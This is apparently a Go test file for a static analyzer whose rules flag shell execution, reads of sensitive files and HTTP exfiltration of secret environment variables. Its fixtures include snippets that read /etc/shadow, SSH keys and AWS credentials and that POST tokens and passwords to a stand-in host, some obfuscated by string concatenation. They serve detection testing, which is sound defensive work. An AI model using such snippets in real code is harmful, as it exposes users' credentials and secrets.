package golang_test

import (
	"context"
	"strings"
	"testing"

	"github.com/skarm/scout/internal/analysis/analyzer"
	"github.com/skarm/scout/internal/analysis/document"
	"github.com/skarm/scout/internal/analysis/languages/golang"
	"github.com/skarm/scout/internal/capture/artifact"
)

func TestGoASTRules(t *testing.T) {
	for _, tc := range []struct {
		name, rule, text string
		count            int
	}{
		{
			name:  "shell",
			rule:  "GO001",
			text:  `package p; import "os/exec"; func f(){ exec.Command("sh", "-c", "echo ok") }`,
			count: 1,
		},
		{
			name:  "alias-constant",
			rule:  "GO001",
			text:  `package p; import e "os/exec"; const shell="ba"+"sh"; func f(){e.Command(shell)}`,
			count: 1,
		},
		{
			name:  "context",
			rule:  "GO001",
			text:  `package p; import("os/exec"; "context"); func f(){exec.CommandContext(context.Background(), "/bin/bash")}`,
			count: 1,
		},
		{
			name:  "non-shell",
			rule:  "GO001",
			text:  `package p; import "os/exec"; func f(){exec.Command("echo", "sh")}`,
			count: 0,
		},
		{
			name:  "shadow",
			rule:  "GO001",
			text:  `package p; import "os/exec"; func f(exec interface{Command(string)}){exec.Command("sh")}`,
			count: 0,
		},
		{
			name:  "block-import-shadow-does-not-escape",
			rule:  "GO001",
			text:  `package p; import "os/exec"; func f(){ { var exec struct{Command func(string)}; exec.Command("sh") }; exec.Command("sh") }`,
			count: 1,
		},
		{
			name:  "closure-parameter-shadows-import",
			rule:  "GO001",
			text:  `package p; import "os/exec"; func f(){ func(exec interface{Command(string)}){exec.Command("sh")}(nil); exec.Command("sh") }`,
			count: 1,
		},
		{
			name:  "short-declaration-is-not-a-constant",
			rule:  "GO001",
			text:  `package p; import "os/exec"; const shell="sh"; func f(){ shell:=shell; exec.Command(shell) }`,
			count: 0,
		},
		{
			name:  "constant-initializer-sees-outer-scope",
			rule:  "GO001",
			text:  `package p; import "os/exec"; const shell="ba"; func f(){ const shell=shell+"sh"; exec.Command(shell) }`,
			count: 1,
		},
		{
			name:  "fake-package",
			rule:  "GO001",
			text:  `package p; import "example.invalid/exec"; func f(){exec.Command("sh")}`,
			count: 0,
		},
		{
			name:  "comments",
			rule:  "GO001",
			text:  "package p\n// exec.Command(\"sh\")\nvar text=`exec.Command(\"sh\")`",
			count: 0,
		},
		{
			name:  "mutable-not-guessed",
			rule:  "GO001",
			text:  `package p; import "os/exec"; func f(){shell:="sh"; shell="echo"; exec.Command(shell)}`,
			count: 0,
		},
		{
			name:  "alias-not-guessed",
			rule:  "GO001",
			text:  `package p; import "os/exec"; func f(){run:=exec.Command; run("sh")}`,
			count: 0,
		},
		{
			name:  "sensitive-concat",
			rule:  "GO002",
			text:  `package p; import "os"; func f(){os.ReadFile("/etc/"+"shadow")}`,
			count: 1,
		},
		{
			name:  "sensitive-join",
			rule:  "GO002",
			text:  `package p; import(o "os"; p "path/filepath"); func f(){o.ReadFile(p.Join(o.Getenv("HOME"),".ssh","id_"+"rsa"))}`,
			count: 1,
		},
		{
			name:  "sensitive-const",
			rule:  "GO002",
			text:  `package p; import "os"; const x="/root/.aws/credentials"; func f(){os.Open(x)}`,
			count: 1,
		},
		{
			name:  "public-path",
			rule:  "GO002",
			text:  `package p; import "os"; func f(){os.ReadFile("/etc/passwd")}`,
			count: 0,
		},
		{
			name:  "sensitive-normalize",
			rule:  "GO002",
			text:  `package p; import "os"; func f(){os.ReadFile("/etc/shadow/../passwd")}`,
			count: 0,
		},
		{
			name:  "home-not-read",
			rule:  "GO002",
			text:  `package p; import "os"; func f(){os.Open(os.Getenv("ARBITRARY_PATH"))}`,
			count: 0,
		},
		{
			name:  "direct-http",
			rule:  "GO003",
			text:  `package p; import("net/http";"os";"strings"); func f(){http.Post("https://example.invalid", "text/plain", strings.NewReader(os.Getenv("API_TOKEN")))}`,
			count: 1,
		},
		{
			name:  "request-construction",
			rule:  "GO003",
			text:  `package p; import(h "net/http";o "os";s "strings"); func f(){h.NewRequest("POST", "https://example.invalid", s.NewReader("token="+o.Getenv("PASSWORD")))}`,
			count: 1,
		},
		{
			name:  "request-context",
			rule:  "GO003",
			text:  `package p; import("net/http";"os";"strings";"context"); func f(){http.NewRequestWithContext(context.Background(),"POST","https://example.invalid",strings.NewReader(os.Getenv("DB_PASSWORD")))}`,
			count: 1,
		},
		{
			name:  "formatted",
			rule:  "GO003",
			text:  `package p; import("net/http";"os";"strings";"fmt"); func f(){http.Post("x","text/plain",strings.NewReader(fmt.Sprintf("%s",os.Getenv("TOKEN"))))}`,
			count: 1,
		},
		{
			name:  "bytes",
			rule:  "GO003",
			text:  `package p; import("net/http";"os";"bytes"); func f(){http.Post("x","x",bytes.NewReader([]byte(os.Getenv("TOKEN"))))}`,
			count: 1,
		},
		{
			name:  "post-form",
			rule:  "GO003",
			text:  `package p; import("net/http";"net/url";"os"); func f(){http.PostForm("x",url.Values{"token":{os.Getenv("API_TOKEN")}})}`,
			count: 1,
		},
		{
			name:  "ordinary-env",
			rule:  "GO003",
			text:  `package p; import("net/http";"os";"strings"); func f(){http.Post("x","x",strings.NewReader(os.Getenv("LANG")))}`,
			count: 0,
		},
		{
			name:  "monkey-not-key",
			rule:  "GO003",
			text:  `package p; import("net/http";"os";"strings"); func f(){http.Post("x","x",strings.NewReader(os.Getenv("MONKEY")))}`,
			count: 0,
		},
		{
			name:  "source-shadow",
			rule:  "GO003",
			text:  `package p; import("net/http";"os";"strings"); func f(os interface{Getenv(string) string}){http.Post("x","x",strings.NewReader(os.Getenv("API_TOKEN")))}`,
			count: 0,
		},
		{
			name:  "sink-shadow",
			rule:  "GO003",
			text:  `package p; import("net/http";"os";"strings"); func f(http interface{Post(...any)}){http.Post("x","x",strings.NewReader(os.Getenv("TOKEN")))}`,
			count: 0,
		},
		{
			name:  "unknown-wrapper",
			rule:  "GO003",
			text:  `package p; import("net/http";"os"); func f(){http.Post("x","x",redact(os.Getenv("TOKEN")))}`,
			count: 0,
		},
		{
			name:  "variable-flow-not-guessed",
			rule:  "GO003",
			text:  `package p; import("net/http";"os";"strings"); func f(){v:=os.Getenv("TOKEN"); v="safe"; http.Post("x","x",strings.NewReader(v))}`,
			count: 0,
		},
		{
			name:  "cyclic-constant-bounded",
			rule:  "GO001",
			text:  `package p; import "os/exec"; const a=a+a; func f(){exec.Command(a)}`,
			count: 0,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			prepared := document.Prepare(context.Background(), artifact.NewFile("fixture.go", []byte(tc.text), false))
			for _, d := range prepared.Diagnostics() {
				if d.Code == "go_syntax_error" {
					t.Fatal("test fixture is invalid Go syntax")
				}
			}
			r := goResult(t, tc.rule, tc.text, 10)
			if len(r.Matches) != tc.count {
				t.Fatalf("expected %d got %+v", tc.count, r)
			}
			for _, m := range r.Matches {
				if m.Start < 0 || m.End > len(tc.text) || m.Start >= m.End {
					t.Fatal("invalid span")
				}
				if tc.rule == "GO003" {
					if len(m.Trace) != 2 || m.Trace[0].Role != "source" || m.Trace[1].Role != "sink" {
						t.Fatal("missing direct trace")
					}
					if !strings.Contains(tc.text[m.Trace[0].Start:m.Trace[0].End], "Getenv") {
						t.Fatal("bad source evidence")
					}
				}
			}
		})
	}
}

func TestGoBudgetAndPhysicalOffsets(t *testing.T) {
	text := "package p\nimport \"os/exec\"\n//line SECRET_SENTINEL:9000\nfunc f(){exec.Command(\"sh\"); exec.Command(\"bash\")}\n"
	r := goResult(t, "GO001", text, 1)
	if !r.Truncated || len(r.Matches) != 1 || text[r.Matches[0].Start:r.Matches[0].End] != `exec.Command("sh")` {
		t.Fatal(r)
	}
	if r := goResult(t, "GO001", text, 0); !r.Truncated || len(r.Matches) != 0 {
		t.Fatal("zero budget ignored")
	}
}

func FuzzGoChecks(f *testing.F) {
	f.Add(`package p; import "os/exec"; func f(){exec.Command("sh")}`)
	f.Add(`package p; const a=a+a`)
	f.Fuzz(func(t *testing.T, text string) {
		if len(text) > 16<<10 {
			return
		}
		doc := document.Prepare(context.Background(), artifact.NewFile("f.go", []byte(text), false))
		for _, a := range golang.Rules() {
			da := a
			r, err := da.Find(context.Background(), doc, 4)
			if err != nil {
				t.Fatal(err)
			}
			if len(r.Matches) > 4 {
				t.Fatal("budget exceeded")
			}
			for _, m := range r.Matches {
				if m.Start < 0 || m.End > len(text) || m.Start >= m.End {
					t.Fatal("invalid source evidence")
				}
			}
		}
	})
}

func TestPartialGoASTKeepsCompleteCalls(t *testing.T) {
	text := `package p;import "os/exec";func f(){exec.Command("sh");exec.Command("bash"`
	doc := document.Prepare(context.Background(), artifact.NewFile("broken.go", []byte(text), false))
	bad := false
	for _, d := range doc.Diagnostics() {
		if d.Code == "go_syntax_error" {
			bad = true
		}
	}
	if !bad {
		t.Fatal("malformed syntax not reported")
	}
	r := goResult(t, "GO001", text, 10)
	if len(r.Matches) != 1 || text[r.Matches[0].Start:r.Matches[0].End] != `exec.Command("sh")` {
		t.Fatalf("complete prefix evidence lost: %+v", r)
	}
}

func goResult(t testing.TB, rule, text string, budget int) analyzer.Result {
	t.Helper()
	for _, a := range golang.Rules() {
		if a.Rule().ID != rule {
			continue
		}
		r, err := a.Find(context.Background(), document.Prepare(context.Background(), artifact.NewFile("p.go", []byte(text), false)), budget)
		if err != nil {
			t.Fatal(err)
		}
		return r
	}
	t.Fatalf("unknown rule %s", rule)
	return analyzer.Result{}
}
